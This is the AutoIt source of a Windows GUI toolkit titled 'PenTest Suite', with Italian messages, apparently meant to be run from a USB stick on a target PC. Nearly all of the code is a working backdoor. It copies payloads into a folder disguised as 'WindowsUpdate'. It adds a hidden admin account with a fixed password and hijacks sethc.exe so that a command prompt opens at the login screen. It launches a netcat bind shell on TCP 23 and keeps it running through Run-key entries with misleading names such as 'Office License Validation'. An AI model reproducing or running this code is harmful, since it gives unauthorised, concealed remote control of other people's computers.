#region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=H:\Immagini\term-30x30.ico
#AutoIt3Wrapper_Outfile=..\..\..\..\media\ned98\02B3-09D6\pentest.exe
#AutoIt3Wrapper_Outfile_x64=H:\Documenti\PenTest\pentest_x64.exe
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_UseUpx=n
#AutoIt3Wrapper_Compile_Both=y
#AutoIt3Wrapper_UseX64=y
#AutoIt3Wrapper_Res_Comment=Coded by WireFreak
#AutoIt3Wrapper_Res_Description=wirefreak.pen.io
#AutoIt3Wrapper_Res_Fileversion=1.3.2.0
#AutoIt3Wrapper_Res_Language=1040
#AutoIt3Wrapper_Res_requestedExecutionLevel=highestAvailable
#AutoIt3Wrapper_Add_Constants=n
#AutoIt3Wrapper_Run_Tidy=y
#endregion ;**** Directives created by AutoIt3Wrapper_GUI ****
#comments-start
	There's no place like 127.0.0.1
	Contacts: nederizer@live.it
#comments-end

#include <Inet.au3>
#include <ButtonConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
$copiaOK = "1"
$PublicIP = "Premi il bottone a lato."
$InternalIP = "Premi il bottone a lato."
#region ### START Koda GUI section ### Form=H:\Scaricati\KODA\Forms\pentest.kxf
$Form1 = GUICreate("PenTest Suite", 451, 268, 268, 147)
$Label1 = GUICtrlCreateLabel("PenTest kit by [ WireFreak ]", 72, 8, 312, 37)
GUICtrlSetFont(-1, 18, 400, 0, "UnPilgi")
GUICtrlSetColor(-1, 0x000000)
$copiafile = GUICtrlCreateButton("Copia File", 32, 80, 75, 25)
$Group1 = GUICtrlCreateGroup("Passo 1", 24, 56, 89, 57)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$Group2 = GUICtrlCreateGroup("Passo 2 - EXPLOIT", 128, 56, 313, 201)
$adminadd = GUICtrlCreateButton("Aggiunta account Admin", 144, 80, 129, 25)
GUICtrlSetState($adminadd, $GUI_DISABLE)
$cmdadd = GUICtrlCreateButton("Aggiunta CMD al Login", 280, 80, 153, 25)
$Group3 = GUICtrlCreateGroup("NetCat", 136, 112, 297, 57)
$netcatadd = GUICtrlCreateButton("Installa NetCat", 144, 128, 81, 33)
$netcat = GUICtrlCreateRadio("NetCat standard", 232, 128, 121, 17)
GUICtrlSetState(-1, $GUI_CHECKED)
$rundll = GUICtrlCreateRadio("Falso RUNDLL32.exe", 232, 144, 129, 17)
$Persistenza = GUICtrlCreateButton("Persistenza", 360, 128, 65, 33)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$Label2 = GUICtrlCreateLabel("There's no place like 127.0.0.1", 160, 232, 245, 33)
GUICtrlSetFont(-1, 14, 400, 0, "UnPilgi")
$Label3 = GUICtrlCreateLabel("IP Pubblico:", 152, 184, 61, 17)
$PUB_IP = GUICtrlCreateLabel($PublicIP, 216, 184, 137, 17)
$Label4 = GUICtrlCreateLabel("IP Interno:", 152, 200, 53, 17)
$INT_IP = GUICtrlCreateLabel($InternalIP, 216, 200, 137, 17)
$Group4 = GUICtrlCreateGroup("IPs", 144, 168, 289, 57)
$get_ip = GUICtrlCreateButton("Get IPs", 360, 184, 65, 33)
GUICtrlCreateGroup("", -99, -99, 1, 1)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$infobtn = GUICtrlCreateButton("INFO", 32, 144, 73, 33)
$contact = GUICtrlCreateButton("Contatti", 32, 200, 73, 33)
$version = GUICtrlCreateLabel("v1.3.2 RC2", 8, 248, 120, 15)
GUICtrlSetFont(-1, 8, 400, 0, "MS PMincho")
GUICtrlSetColor(-1, 0x000000)
GUISetState(@SW_SHOW)
#endregion ### END Koda GUI section ###

Switch @OSArch
	Case "x86"
		$OS = "32"
	Case "x64"
		$OS = "64"
	Case "IA64"
		Sleep(10)
	Case Else
		MsgBox(16, "Errore", "Architettura CPU non riconosciuta.")
		Exit
EndSwitch

While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg
		Case $GUI_EVENT_CLOSE
			Exit

		Case $copiafile
			If $OS = "32" Then
				$copia0 = FileCopy(@WorkingDir & "\res\loader.exe", "C:\WindowsUpdate_33W5K9\", 9)
				If $copia0 = 1 Then
					Sleep(10)
				Else
					MsgBox(0, "Oh, cazzo!", "Errore durante la copiatura di 'loader.exe'")
					$copiaOK = "0"
				EndIf
			EndIf
			If $OS = "64" Then
				$copia0 = FileCopy(@WorkingDir & "\res\loader_x64.exe", "C:\WindowsUpdate_33W5K9\", 9)
				If $copia0 = 1 Then
					Sleep(10)
				Else
					MsgBox(0, "Oh, cazzo!", "Errore durante la copiatura di 'loader_x64.exe'")
					$copiaOK = "0"
				EndIf
			EndIf
			$copia1 = FileCopy(@WorkingDir & "\res\persist.exe", "C:\WindowsUpdate_33W5K9\", 9)
			If $copia1 = 1 Then
				Sleep(10)
			Else
				MsgBox(0, "Oh, cazzo!", "Errore durante la copiatura di 'persist.exe'")
				$copiaOK = "0"
			EndIf
			$copia2 = FileCopy(@WorkingDir & "\res\v4l.wsf", "C:\WindowsUpdate_33W5K9\", 9)
			If $copia2 = 1 Then
				Sleep(10)
			Else
				MsgBox(0, "Oh, cazzo!", "Errore durante la copiatura di 'v4l.wsf'")
				$copiaOK = "0"
			EndIf
			$copia3 = FileCopy(@WorkingDir & "\res\nc.exe", "C:\WindowsUpdate_33W5K9\", 9)
			If $copia3 = 1 Then
				Sleep(10)
			Else
				MsgBox(0, "Oh, cazzo!", "Errore durante la copiatura di 'nc.exe'" & @CRLF & "Controllare che il server non sia in esecuzione.")
				$copiaOK = "0"
			EndIf
			If $copiaOK = "1" Then
				If Not IsDeclared("iMsgBoxAnswer") Then Local $iMsgBoxAnswer
				$iMsgBoxAnswer = MsgBox(262212, "File copiati con successo!", "Tutti i file sono stati correttamente copiati." & @CRLF & "Vuoi passare al loader su disco?")
				Select
					Case $iMsgBoxAnswer = 6 ;Yes
						If $OS = "32" Then
							Run("C:\WindowsUpdate_33W5K9\loader.exe")
						EndIf
						If $OS = "64" Then
							Run("C:\WindowsUpdate_33W5K9\loader_x64.exe")
						EndIf
						MsgBox(0, "!!IMPORTANTE!!", "ATTENZIONE: Rimuovere adesso la chiavetta USB per il corretto funzionamento di NetCat.")
						Exit
					Case $iMsgBoxAnswer = 7 ;No
						Sleep(10)
				EndSelect
			EndIf
			If $copiaOK = "0" Then MsgBox(0, "Oh, cazzo!", "Errore durante la copiatura dei file.")
		Case $adminadd
			RunWait(@ComSpec & "cscript C:\WindowsUpdate_33W5K9\v4l.wsf", "", @SW_HIDE)
			MsgBox(64, "Tutto fatto!", "Account admin secondario abilitato. Dati per il login:" & @CRLF & "AdminSys:12345" & @CRLF & "Procedo a nascondere l'account...")
			RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList", "AdminSys", "REG_DWORD", "AdminSys")
			MsgBox(48, "OK", "Account nascosto dalla schermata di login. Dati di accesso:" & @CRLF & "AdminSys:12345")
		Case $cmdadd
			RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe", "Debugger", "REG_SZ", "C:\\windows\\system32\\cmd.exe")
			MsgBox(48, "OK", "Aggiunto terminale alla schermata di login." & @CRLF & "Premere SHIFT 5 volte di seguito per attivare.")
		Case $netcatadd
			$netcatchecked = GUICtrlRead($netcat)
			If $netcatchecked = 1 Then
				If FileExists("C:\WindowsUpdate_33W5K9\nc.exe") Then
					Run("C:\WindowsUpdate_33W5K9\nc.exe -ldp 23 -e C:\Windows\System32\cmd.exe")
					RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "WindowsUpdate", "REG_SZ", "C:\\Windows\\WindowsUpdate_33W5K9\\nc.exe -ldp 23 -e C:\Windows\System32\cmd.exe")
					MsgBox(0, "NetCat Standard", "Il server NetCat è stato avviato in ascolto sulla porta TCP 23. Output su CMD." & @CRLF & "Aggiunto all'AutoRun (HKEY_LOCAL_MACHINE).")
				Else
					MsgBox(0, "Oh, cazzo!", "File non trovato!!")
				EndIf
			EndIf
			$rundllchecked = GUICtrlRead($rundll)
			If $rundllchecked = 1 Then
				If FileExists("C:\WindowsUpdate_33W5K9\rundll32b.exe") Then
					Run("C:\WindowsUpdate_33W5K9\rundll32b.exe")
					RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "WindowsUpdate_Service", "REG_SZ", "C:\\Windows\\WindowsUpdate_33W5K9\\rundll32b.exe")
					MsgBox(0, "NetCat Mascherato", "Il server NetCat (rundll32b.exe) è stato avviato in ascolto sulla porta TCP 2482. Output su CMD.")
				Else
					MsgBox(0, "Oh, cazzo!", "File non trovato!!")
				EndIf
			EndIf
		Case $netcat
			GUICtrlSetState($Persistenza, $GUI_ENABLE)
			GUICtrlSetState($netcatadd, $GUI_ENABLE)
		Case $rundll
			GUICtrlSetState($Persistenza, $GUI_DISABLE)
			GUICtrlSetState($netcatadd, $GUI_DISABLE)
		Case $Persistenza
			RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Office License Validation", "REG_SZ", "C:\WindowsUpdate_33W5K9\persist.exe")
			MsgBox(0, "Persistenza NetCat", "Avviata persistenza per il server NetCat. Avrà effetto solo al prossimo riavvio!" & @CRLF & "Delay tra i controlli: 5 secondi." & @CRLF & @CRLF & "Script aggiunto all'AutoRun (HKEY_LOCAL_MACHINE).")
		Case $get_ip
			Local $PublicIP = _GetIP()
			$PUB_IP = GUICtrlCreateLabel($PublicIP, 216, 184, 137, 17)
			If @IPAddress1 = "127.0.0.1" Then
				Sleep(10)
			Else
				$InternalIP = @IPAddress1
			EndIf
			If @IPAddress2 = "0.0.0.0" Then
				Sleep(10)
			Else
				$InternalIP = @IPAddress2
			EndIf
			If @IPAddress3 = "0.0.0.0" Then
				Sleep(10)
			Else
				$InternalIP = @IPAddress3
			EndIf
			If @IPAddress4 = "0.0.0.0" Then
				Sleep(10)
			Else
				$InternalIP = @IPAddress4
			EndIf
			$INT_IP = GUICtrlCreateLabel($InternalIP, 216, 200, 137, 17)
			GUICtrlSetState($get_ip, $GUI_DISABLE)
		Case $infobtn
			If Not IsDeclared("iMsgBoxAnswer") Then Local $iMsgBoxAnswer
			$iMsgBoxAnswer = MsgBox(68, "INFO", "Cerchi istruzioni su come usare questo Toolkit? Vuol dire che non lo avresti nemmeno dovuto aprire..." & @CRLF & @CRLF & "Vuoi invece vedere il CHANGELOG?")
			Select
				Case $iMsgBoxAnswer = 6 ;Yes
					MsgBox(32, "CHANGELOG", "v1.3.2 RC2" & @CRLF & "* WireFreak ha preso possesso di questo toolkit ;)" & @CRLF & @CRLF & "v1.3.2 RC1" & @CRLF & "* Aggiunto 'Loader' su disco per corretto direzionamento server NetCat" & @CRLF & "* Il Loader può ora verificare l'integrità dei file necessari" & @CRLF & @CRLF & "v1.3.1 BETA" & @CRLF & "* Temporaneamente disabilitate funzioni 'Aggiunta Admin', 'NetCat mascherato (rundll32b.exe)' e 'Persistenza rundll32b.exe'" & @CRLF & "* Risolti numerosi errori nell'avvio dei server" & @CRLF & "* Aggiunta opzione '-d' a NetCat per eseguire il detach dal terminale" & @CRLF & "* Disabilitato bottone 'Get IPs' dopo prima pressione" & @CRLF & @CRLF & "v1.3.0 BETA" & @CRLF & "* Creata la GUI" & @CRLF & "* Aggiunta sezione IP" & @CRLF & "* Nascosto Admin secondario" & @CRLF & "* Aggiunto CHANGELOG" & @CRLF & "* Aggiunta label di versione nella GUI" & @CRLF & "* Modifica del sistema di copia dei file")
				Case $iMsgBoxAnswer = 7 ;No
					Sleep(10)
			EndSelect
		Case $contact
			MsgBox(16, "Seriamente?!", "Pensavi davvero di poter trovare un contatto qui, in bella vista?" & @CRLF & "Il decompiler è tuo amico! Piccolo aiutino: Exe2Aut...")
	EndSwitch
WEnd
